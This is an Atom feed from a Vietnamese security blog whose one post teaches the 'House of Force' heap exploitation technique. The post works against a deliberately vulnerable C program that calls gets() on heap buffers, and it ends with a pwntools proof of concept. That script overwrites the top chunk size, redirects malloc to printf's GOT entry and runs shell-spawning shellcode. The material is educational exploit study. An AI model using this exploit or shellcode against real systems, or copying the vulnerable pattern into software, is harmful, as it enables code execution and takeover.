<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploitation | HarDToBelieve's Blog]]></title>
  <link href="http://hardtobelieve.github.io/blog/categories/exploitation/atom.xml" rel="self"/>
  <link href="http://hardtobelieve.github.io/"/>
  <updated>2016-05-14T00:14:54+07:00</updated>
  <id>http://hardtobelieve.github.io/</id>
  <author>
    <name><![CDATA[HarDToBelieve]]></name>
    <email><![CDATA[tuanit96@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[House of Force]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/03/24/house-of-force/"/>
    <updated>2016-03-24T21:31:51+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/03/24/house-of-force</id>
    <content type="html"><![CDATA[<p>House of force là 1 trong 6 phương pháp được nhắc đến trong <a href="https://github.com/Malformation/Notes/blob/master/MallocMaleficarum.txt">Malloc Maleficarum</a>. Một kỹ thuật khai thác lỗ hổng ở bộ nhớ heap rất hay và vẫn được sử dụng cho đến tận bây giờ</p>

<!--more-->


<h1>Bài toán</h1>

<p>Giả sử ta có đoạn code sau:</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// gcc HouseOfForce.c -z execstack

int main () {
    printf ("What's your name?\n");
    char *name = (char *)malloc(256);
    gets(name);      
    printf ("Hello %s\n", name);

    int n;
    printf ("Size of infos: ");
    scanf ("%d\n",&amp;n);   
    char *info = (char *)malloc(n);
    gets(info);      

    printf ("Size of wisdom: ");
    scanf ("%d\n", &amp;n);
    char *wish = (char *)malloc(n);
    gets(wish);     
    printf ("God bless you! %s", name);

    free(name);
    free(info);
    free(wish);
    return 0;
}
</code></pre>

<p>Điều kiện để ta có thể sử dụng House of Force (HoF) là cần tối thiểu 3 lần malloc:</p>

<ul>
<li>Malloc 1: Ta có thể điều khiển được topchunk ( biết địa chỉ của nó và có thể thay đổi giá trị ).</li>
<li>Malloc 2: Quản lý được size khi malloc.</li>
<li>Malloc 3: Thực hiện khai thác lỗ hổng.</li>
</ul>


<p>Trước tiên ta cần hiểu cách hoạt động của Topchunk. Đây là 1 thành phần có khả năng cấp phát bộ nhớ khi free list chunk còn trống hoặc không đủ cho yêu cầu từ người dùng. Topchunk luôn nằm sau heap sau cùng, nên ở  lần call thứ nhất, nếu ta biết đc địa chỉ heap ở lần thứ nhất này thì  chỉ việc cộng với size của nó sẽ ra đc địa chỉ size của topchunk, cộng  thêm 4 byte sẽ ra đc địa chỉ đầu tiên của vùng nhớ thuộc topchunk. Đoạn code của hàm int_malloc như sau:</p>

<pre><code class="c">static void* _int_malloc(mstate av, size_t bytes) {
    INTERNAL_SIZE_T nb;             /* normalized request size */
    mchunkptr       victim;         /* inspected/selected chunk */
    INTERNAL_SIZE_T size;           /* its size */
    mchunkptr       remainder;      /* remainder from a split */
    unsigned long   remainder_size; /* its size */

    checked_request2size(bytes, nb);

    [...]

    victim = av-&gt;top;
    size = chunksize(victim);
    if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE)) {
        remainder_size = size - nb;
        remainder = chunk_at_offset(victim, nb);
        av-&gt;top = remainder;
        set_head(victim, nb | PREV_INUSE | (av!=&amp;main_arena ? NON_MAIN_ARENA : 0));

        set_head(remainder, remainder_size | PREV_INUSE);

        check_malloced_chunk(av, victim, nb);
        void *p = chunk2mem(victim);
        if (__builtin_expect (perturb_byte, 0))
            alloc_perturb (p, bytes);
        return p;
    }

    [...]
}
</code></pre>

<p>Để có thể sử dụng được topchunk, kích thước của nó phải lớn hơn kích thước mà người dùng yêu cầu. Sau đó, topchunk sẽ bị giảm đi một lượng bằng đúng kích thước người dùng yêu cầu và topchunk sẽ được đặt ở. &lt;địa chỉ topchunk cũ> + kích thước Ta có thể thấy vì địa chỉ topchunk là một số nguyên 4 byte, vậy nếu ta cộng một lượng mà kết quả vượt quá MAX_INT thì địa chỉ sẽ bị quay vòng lại ( 2&rsquo;s complement ). Như vậy, ta có thể điều khiển được giá trị trả về của hàm malloc ở lần sau.</p>

<p>Khai thác
Đầu tiên, ta sẽ lấp đầy bộ nhớ vừa được phát và sau đó, để đơn đơn giản ta sẽ đặt kích thước của topchunk là 0xffffffff.  Ngoài ra khi ta malloc(n) thì chương trình sẽ trả lại một vùng nhớ có độ lớn là ((n + 4 + 7) &amp; ~7)để chứa metadata của heap + data của người dùng, ta có thể dùng công thức này để tính toán vị trí của topchunk</p>

<p><img src="/assets/hof1.png" alt="Heap memory" /></p>

<p>Sau đó, ta sẽ yêu cầu cấp phát một lượng byte sao cho malloc sẽ trả về đúng địa chỉ ta cần (GOT, code section, &hellip;), ví dụ ở đây ta sẽ ghi đè lên hàm printf vì sau khi malloc lần cuối chương trình có gọi hàm này.</p>

<p><img src="/assets/hof2.png" alt="GOT table" /></p>

<p>Lần malloc cuối, ta chỉ việc viết đè lên đó bất cứ thứ gì. Tuy nhiên ở chương trình này, địa chỉ GOT của hàm printf không chia hết cho 8, trong khi hàm malloc luôn trả về một số nguyên 4 byte chia hết cho 8, nên ta phải thêm padding vào trước đó</p>

<h1>Proof of Concept</h1>

<pre><code class="python">from pwn import *

s = remote("localhost", 1928)

shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"
nops = "\x90" * (260 - len(shellcode))
max_size = 0xffffffff
offset = 0x804a00c - 8 - 0x804b110
dummy = 0xdeadbeaf
new_request = 256
first_heap = 0x804b008

payload = ""
payload += shellcode + nops + p32(max_size) + "\n"
payload += str(offset) + "\n" + p32(dummy) + "\n"
payload += str(new_request) + "\n" + p32(dummy) + p32(first_heap)

s.send(payload)
s.interactive()
</code></pre>

<p><strong><em>Chú ý</em></strong>: Khi lấy địa chỉ để hàm malloc trả về, ta phải trừ đi 0x8 byte do metadata của heap. Cũng chính vì lấy đi 0x8 byte nên phương thức này sẽ làm hỏng 2 địa chỉ liền kề địa chỉ ta cần lấy. Ví dụ nếu ta điền vào bảng GOT, HoF sẽ làm hỏng 2 hàm liên tiếp trên đó, nên chương trình có thể sẽ bị SIGSEV trước khi đến được nơi ta khai thác lỗ hổng</p>
]]></content>
  </entry>
  
</feed>
